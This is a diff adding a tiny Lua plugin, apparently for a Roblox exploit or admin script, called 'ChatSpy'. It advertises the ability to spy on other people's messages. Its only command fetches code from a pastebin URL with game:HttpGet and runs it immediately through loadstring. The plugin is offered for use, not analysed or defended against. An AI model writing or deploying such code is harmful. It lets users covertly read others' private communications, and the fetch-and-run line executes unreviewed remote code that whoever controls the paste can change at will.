@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "ChatSpy",
+	["PluginDescription"] = "Allows you to spy on other people's messages",
+	["Commands"] = {
+		["Spy"] = {
+			["Description"] = "Spy",
+			["Aliases"] = {'ChatSpy', 'CS', 'ChatS'},
+			["Function"] = function(args,speaker)
+				 loadstring(game:HttpGet("https://pastebin.com/raw/fQ54xXEn"))()
+			end,
+		},
+	},
+}
+
+return Plugin
